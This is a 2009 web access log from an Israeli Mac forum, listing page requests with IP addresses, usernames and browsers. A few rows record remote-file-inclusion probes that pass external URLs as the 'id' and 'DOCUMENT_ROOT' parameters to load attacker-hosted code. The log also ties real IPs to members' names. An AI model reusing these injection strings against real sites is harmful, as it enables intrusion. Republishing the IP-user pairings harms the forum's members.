id,forum_id,page,ref,admin,user_ip,logon_name,timestamp,user_browser
1613,1,/archive_single_view.php?id=122904&gid=122545,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:42:15,Mediapartners-Google
1616,1,/,<blank>,0,213.8.91.198,MacinTom,2009-01-10 12:42:25,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1618,1,/,<blank>,0,213.8.91.198,MacinTom,2009-01-10 12:42:34,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1620,1,/single_board.php?id=836,<blank>,0,74.6.22.187,*Guest,2009-01-10 12:42:36,Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
1621,1,/archive_single_view.php?id=58114&gid=58114,http://forum.mac-it.co.il/archive_single_view.php?id=152459&gid=152382,0,87.68.243.59,Trillian,2009-01-10 12:42:37,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/525.18 (KHTML, like Gecko, Safari/525.20) OmniWeb/v622.3.0.105198"
1623,1,/archive_single_view.php?id=58114&gid=58114,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:42:39,Mediapartners-Google
1627,1,/single_view.php?id=29559&gid=29545,http://forum.mac-it.co.il/tag_view.php?id=16,0,192.115.66.26,*Guest,2009-01-10 12:43:02,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.40607)
1629,1,/archive_single_view.php?id=29559&gid=29545,<blank>,0,192.115.66.26,*Guest,2009-01-10 12:43:03,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.40607)
1630,1,/,<blank>,0,217.132.167.119,*Guest,2009-01-10 12:43:06,Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; InfoPath.2)
1632,1,/single_view.php?id=151316&gid=151091,http://www.google.co.il/search?sourceid=navclient&ie=UTF-8&rlz=1T4GPTB_enIL297IL298&q=%d7%93%d7%95%d7%a7%d7%99%d7%a0%d7%92+%d7%a1%d7%98%d7%99%d7%99%d7%a9%d7%9f,0,84.109.9.244,*Guest,2009-01-10 12:43:14,Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; MS Internet Explorer; OfficeLiveConnector.1.3; OfficeLivePatch.0.0)
1633,1,/archive_single_view.php?id=151316&gid=151091,<blank>,0,84.109.9.244,*Guest,2009-01-10 12:43:14,Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; MS Internet Explorer; OfficeLiveConnector.1.3; OfficeLivePatch.0.0)
1635,1,/archive_single_view.php?id=151316&gid=151091,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:43:23,Mediapartners-Google
1637,1,/index.php,<blank>,0,79.176.230.179,guyphone,2009-01-10 12:43:38,Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; he; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1638,1,/,<blank>,0,79.182.157.112,*Guest,2009-01-10 12:43:39,Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1639,1,/,<blank>,0,79.176.230.179,guyphone,2009-01-10 12:43:40,Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; he; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1642,1,/archive_single_view.php?id=98758&gid=98753,http://www.google.co.il/search?hl=iw&q=photoshop+ME+FOR+MAC&start=10&sa=N,0,89.139.175.144,*Guest,2009-01-10 12:43:51,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; en-us) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1"
1643,1,/archive_single_view.php?id=98758&gid=98753,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:43:53,Mediapartners-Google
1646,1,/archive_single_view.php?id=29559&gid=29545,http://forum.mac-it.co.il/archive_single_view.php?id=29559&gid=29545,0,192.115.66.26,*Guest,2009-01-10 12:44:02,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.40607)
1648,1,/archive_single_view.php?id=173132&gid=173129,<blank>,0,74.6.22.187,*Guest,2009-01-10 12:44:07,Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
1650,1,/single_view.php?id=164157&gid=164141,<blank>,0,82.81.27.28,*Guest,2009-01-10 12:44:14,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5; en-us) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1"
1651,1,/archive_single_view.php?id=164157&gid=164141,http://forum.mac-it.co.il/single_view.php?id=164157&gid=164141,0,82.81.27.28,*Guest,2009-01-10 12:44:15,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5; en-us) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1"
1653,1,/,<blank>,0,77.126.146.28,yyy,2009-01-10 12:44:16,Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1654,1,/,<blank>,0,77.126.146.28,yyy,2009-01-10 12:44:18,Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1655,1,/single_view.php?id=136500&gid=136500,<blank>,0,74.6.22.187,*Guest,2009-01-10 12:44:19,Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
1656,1,/,http://forum.mac-it.co.il/,1,78.131.22.210,גזים,2009-01-10 12:44:23,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1657,1,/,<blank>,0,213.8.91.198,MacinTom,2009-01-10 12:44:24,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1659,1,/,http://forum.mac-it.co.il/archive_single_view.php?id=29559&gid=29545,0,192.115.66.26,*Guest,2009-01-10 12:44:26,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.40607)
1661,1,/archive_single_view.php?id=172887&gid=172878,<blank>,0,74.6.22.187,*Guest,2009-01-10 12:44:29,Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
1662,1,/forum/single_board.php?id=456,<blank>,0,74.6.22.110,*Guest,2009-01-10 12:44:34,Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
1663,1,/,<blank>,0,77.125.103.242,matanxmou,2009-01-10 12:44:35,Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; he; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1664,1,/index.qr.php?forum_id=1&id=174321,http://forum.mac-it.co.il/,1,78.131.22.210,גזים,2009-01-10 12:44:38,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1666,1,/single_view.php?id=23600&gid=23580,<blank>,0,74.6.22.187,*Guest,2009-01-10 12:44:41,Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
1667,1,/post.php?forum_id=1&id=174321&quick_title=&quick_body=,http://forum.mac-it.co.il/,1,78.131.22.210,גזים,2009-01-10 12:44:44,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1669,1,/index.php?forum_id=1&page=2,http://forum.mac-it.co.il/,0,213.8.91.198,MacinTom,2009-01-10 12:44:51,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1671,1,/tag_view.php?id=19,http://www.google.co.il/search?hl=iw&q=VP6+Flash+Video+%D7%94%D7%9E%D7%A8%D7%94&meta=&aq=f&oq=,0,217.132.249.86,*Guest,2009-01-10 12:44:54,Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WallaIE7)
1672,1,/tag_view.php?id=64,<blank>,0,65.55.209.84,*Guest,2009-01-10 12:44:55,msnbot/1.1 (+http://search.msn.com/msnbot.htm)
1675,1,/,http://iphone.mac-it.co.il/,0,77.127.111.212,קילגור,2009-01-10 12:45:15,Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4
1676,1,/board.php,http://forum.mac-it.co.il/,0,192.115.66.26,*Guest,2009-01-10 12:45:19,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.40607)
1678,1,/post.php?forum_id=1&id=174321&quick_title=&quick_body=,http://forum.mac-it.co.il/post.php?forum_id=1&id=174321&quick_title=&quick_body=,1,78.131.22.210,גזים,2009-01-10 12:45:21,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1679,1,/index.php,http://forum.mac-it.co.il/post.php?forum_id=1&id=174321&quick_title=&quick_body=,1,78.131.22.210,גזים,2009-01-10 12:45:22,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1681,1,/,<blank>,1,78.131.22.210,גזים,2009-01-10 12:45:23,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1682,1,/index.php?forum_id=1&page=3,http://forum.mac-it.co.il/index.php?forum_id=1&page=2,0,213.8.91.198,MacinTom,2009-01-10 12:45:23,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1683,1,/tag_view.php?id=http://babycaleb.fortunecity.co.uk/index.htm?,<blank>,0,210.105.132.249,*Guest,2009-01-10 12:45:28,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
1685,1,/forum/tag_view.php?id=http://babycaleb.fortunecity.co.uk/index.htm?,<blank>,0,210.105.132.249,*Guest,2009-01-10 12:45:41,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
1687,1,/,<blank>,0,79.177.132.72,*Guest,2009-01-10 12:45:51,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1691,1,/,<blank>,0,84.108.196.212,odedia,2009-01-10 12:46:13,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
1694,1,/,http://forum.mac-it.co.il/,0,79.178.136.44,Nadav,2009-01-10 12:46:16,Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1695,1,/result.php?keyword=plex&byuser=0,http://forum.mac-it.co.il/,0,84.108.196.212,odedia,2009-01-10 12:46:20,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
1697,1,/result.php?keyword=plex&byuser=0,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:46:31,Mediapartners-Google
1698,1,/index.qr.php?forum_id=1&id=174320,http://forum.mac-it.co.il/,1,78.131.22.210,גזים,2009-01-10 12:46:33,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1699,1,/index.php?forum_id=1&page=4,http://forum.mac-it.co.il/index.php?forum_id=1&page=3,0,213.8.91.198,MacinTom,2009-01-10 12:46:36,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1702,1,/quick_post.php,http://forum.mac-it.co.il/,1,78.131.22.210,גזים,2009-01-10 12:46:44,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1703,1,/index.php,http://forum.mac-it.co.il/quick_post.php,1,78.131.22.210,גזים,2009-01-10 12:46:44,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1704,1,/,<blank>,1,78.131.22.210,גזים,2009-01-10 12:46:45,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1707,1,/index.php?forum_id=1&page=1,http://forum.mac-it.co.il/index.php?forum_id=1&page=4,0,213.8.91.198,MacinTom,2009-01-10 12:47:03,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1708,1,/single_view.php?id=172416&gid=172416,<blank>,0,77.127.18.135,*Guest,2009-01-10 12:47:04,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;1813)
1711,1,/edit.php?id=174321&forum_id=forum_01,http://forum.mac-it.co.il/index.php?forum_id=1&page=1,0,213.8.91.198,MacinTom,2009-01-10 12:47:19,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1712,1,/tag_view.php?id=78,<blank>,0,74.6.22.187,*Guest,2009-01-10 12:47:19,Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
1717,1,/,<blank>,0,79.179.103.221,BLKadder,2009-01-10 12:47:33,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
1718,1,/board.php?page=1&type=3,<blank>,0,192.115.66.26,*Guest,2009-01-10 12:47:34,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.40607)
1719,1,/index.qr.php?forum_id=1&id=174314,http://forum.mac-it.co.il/,1,78.131.22.210,גזים,2009-01-10 12:47:35,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1720,1,/board.php?page=1&type=3,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:47:37,Mediapartners-Google
1723,1,/quick_post.php,http://forum.mac-it.co.il/,1,78.131.22.210,גזים,2009-01-10 12:47:48,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1724,1,/index.php,http://forum.mac-it.co.il/quick_post.php,1,78.131.22.210,גזים,2009-01-10 12:47:49,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1725,1,/,<blank>,1,78.131.22.210,גזים,2009-01-10 12:47:49,Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1727,1,/edit.php?id=174321&forum_id=forum_01,http://forum.mac-it.co.il/edit.php?id=174321&forum_id=forum_01,0,213.8.91.198,MacinTom,2009-01-10 12:47:54,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1728,1,/archive_single_view.php?id=141281&gid=141276,http://www.google.co.il/search?q=slickedit+eclipse&hl=iw&lr=lang_iw&sa=X&oi=lrtip&ct=restrict&cad=9,0,79.178.42.44,*Guest,2009-01-10 12:47:56,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)
1729,1,/index.php?forum_id=1,http://forum.mac-it.co.il/feed.php?referer=http://forum.mac-it.co.il/index.php?forum_id=1&page=1,0,213.8.91.198,MacinTom,2009-01-10 12:47:56,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1731,1,/index.qr.php?forum_id=1&id=174322,http://forum.mac-it.co.il/index.php?forum_id=1,0,213.8.91.198,MacinTom,2009-01-10 12:48:05,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1732,1,/archive_single_view.php?id=141281&gid=141276,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:48:08,Mediapartners-Google
1735,1,/index.php,<blank>,0,128.139.226.37,shvecht,2009-01-10 12:48:21,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/528.10+ (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
1736,1,/,http://forum.mac-it.co.il/index.php,0,128.139.226.37,shvecht,2009-01-10 12:48:22,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/528.10+ (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
1737,1,/quick_post.php,http://forum.mac-it.co.il/index.php?forum_id=1,0,213.8.91.198,MacinTom,2009-01-10 12:48:23,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1738,1,/index.php,http://forum.mac-it.co.il/quick_post.php,0,213.8.91.198,MacinTom,2009-01-10 12:48:24,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1739,1,/,<blank>,0,213.8.91.198,MacinTom,2009-01-10 12:48:25,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1740,1,/archive_single_view.php?id=129102&gid=129102,<blank>,0,192.118.11.112,*Guest,2009-01-10 12:48:29,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5; en-us) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1"
1741,1,/archive_single_view.php?id=122904&gid=122545,<blank>,0,87.68.243.59,Trillian,2009-01-10 12:48:32,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/525.18 (KHTML, like Gecko, Safari/525.20) OmniWeb/v622.3.0.105198"
1742,1,/board.php?page=1&type=4,<blank>,0,192.115.66.26,*Guest,2009-01-10 12:48:33,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.40607)
1743,1,/archive_single_view.php?id=129102&gid=129102,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:48:34,Mediapartners-Google
1745,1,/board.php?page=1&type=5,<blank>,0,192.115.66.26,*Guest,2009-01-10 12:48:42,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.40607)
1746,1,/,<blank>,0,79.179.103.221,BLKadder,2009-01-10 12:48:51,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
1747,1,/,http://forum.mac-it.co.il/archive_single_view.php?id=129102&gid=129102,0,192.118.11.112,*Guest,2009-01-10 12:48:52,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5; en-us) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1"
1748,1,/,<blank>,0,213.8.91.198,MacinTom,2009-01-10 12:48:55,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1750,1,/single_view.php?id=173229&gid=173229,http://www.google.co.il/search?hl=iw&q=WRT54GL&btnG=%D7%97%D7%99%D7%A4%D7%95%D7%A9&meta=lr%3Dlang_iw,0,79.179.111.164,*Guest,2009-01-10 12:48:59,Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506; Media Center PC 5.0; .NET CLR 3.5.21022)
1752,1,/board.php?page=1&type=1,<blank>,0,192.115.66.26,*Guest,2009-01-10 12:49:09,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.40607)
1753,1,/board.php?page=1&type=1,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:49:12,Mediapartners-Google
1755,1,/,http://forum.mac-it.co.il/board.php?page=1&type=1,0,192.115.66.26,*Guest,2009-01-10 12:49:19,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.40607)
1756,1,//index.php?DOCUMENT_ROOT=http://psis-jeddah.com/js/fx29id.txt??,<blank>,0,81.169.182.232,*Guest,2009-01-10 12:49:20,Mozilla/5.0
1759,1,/,http://forum.mac-it.co.il/,0,192.115.66.26,*Guest,2009-01-10 12:49:40,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.40607)
1761,1,/archive.php,http://forum.mac-it.co.il/,0,192.115.66.26,*Guest,2009-01-10 12:49:50,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.40607)
1764,1,/,<blank>,0,79.176.151.175,*Guest,2009-01-10 12:50:21,Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1765,1,/,<blank>,0,77.125.103.242,matanxmou,2009-01-10 12:50:26,Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; he; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1770,1,/,<blank>,0,213.8.91.198,MacinTom,2009-01-10 12:50:44,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1771,1,/archive_single_view.php?id=167189&gid=167189,http://forum.mac-it.co.il/result.php?keyword=plex&byuser=0,0,84.108.196.212,odedia,2009-01-10 12:50:46,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
1774,1,/archive_single_view.php?id=167189&gid=167189,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:50:51,Mediapartners-Google
1775,1,/,<blank>,0,84.109.22.248,ascensi0n,2009-01-10 12:50:53,Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1776,1,/,<blank>,0,79.179.144.115,*Guest,2009-01-10 12:50:55,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
1777,1,/archive_single_view.php?id=36483&gid=36483,http://www.google.co.il/search?hl=iw&q=%D7%94%D7%A8%D7%A9%D7%9E%D7%94+%D7%9C%D7%A1%D7%A7%D7%99%D7%99%D7%A4&meta=&aq=0&oq=%D7%94%D7%A8%D7%A9%D7%9E%D7%94+%D7%9C%D7%A1%D7%A7%D7%99%D7%99,0,82.81.70.198,*Guest,2009-01-10 12:50:57,Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
1780,1,/tag_view.php?id=81,http://www.google.com/search?source=ig&hl=iw&rlz=1G1GGLQ_IWIL299&q=%D7%A2%D7%91%D7%A8%D7%99%D7%AA+%D7%9C%D7%90%D7%99%D7%99%D7%A4%D7%95%D7%9F&meta=lr%3D,0,89.139.104.176,*Guest,2009-01-10 12:51:13,Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)
1782,1,/result.php?keyword=plex+%D7%A2%D7%91%D7%A8%D7%99%D7%AA&byuser=0,http://forum.mac-it.co.il/archive_single_view.php?id=167189&gid=167189,0,84.108.196.212,odedia,2009-01-10 12:51:24,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
1785,1,/,<blank>,0,89.139.162.173,טובטוב,2009-01-10 12:51:33,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; en-us) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1"
1786,1,/result.php?keyword=plex+%D7%A2%D7%91%D7%A8%D7%99%D7%AA&byuser=0,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:51:38,Mediapartners-Google
1787,1,/result.php?keyword=plex+%D7%A2%D7%91%D7%A8%D7%99%D7%AA&byuser=0,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:51:40,Mediapartners-Google
1788,1,/,<blank>,0,213.8.91.198,MacinTom,2009-01-10 12:51:48,Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
1790,1,/result.php?keyword=plex&byuser=0,http://forum.mac-it.co.il/result.php?keyword=plex+%D7%A2%D7%91%D7%A8%D7%99%D7%AA&byuser=0,0,84.108.196.212,odedia,2009-01-10 12:51:51,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
1791,1,/,<blank>,0,77.125.103.242,matanxmou,2009-01-10 12:51:57,Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; he; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
1793,1,/archive_single_view.php?id=140178&gid=140178,<blank>,0,74.6.22.187,*Guest,2009-01-10 12:52:08,Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
1795,1,/archive_single_view.php?id=11416&gid=11416,http://www.google.co.il/search?hl=iw&q=WINRAR+FOR+MAC&btnG=%D7%97%D7%99%D7%A4%D7%95%D7%A9+%D7%91-Google&meta=&aq=f&oq=,0,89.139.175.144,*Guest,2009-01-10 12:52:13,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; en-us) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1"
1796,1,/archive_single_view.php?id=11416&gid=11416,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:52:15,Mediapartners-Google
1798,1,/archive_single_view.php?id=163461&gid=163461,http://forum.mac-it.co.il/result.php?keyword=plex&byuser=0,0,84.108.196.212,odedia,2009-01-10 12:52:17,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
1799,1,/archive_single_view.php?id=163461&gid=163461,<blank>,0,66.249.67.184,*Guest,2009-01-10 12:52:20,Mediapartners-Google
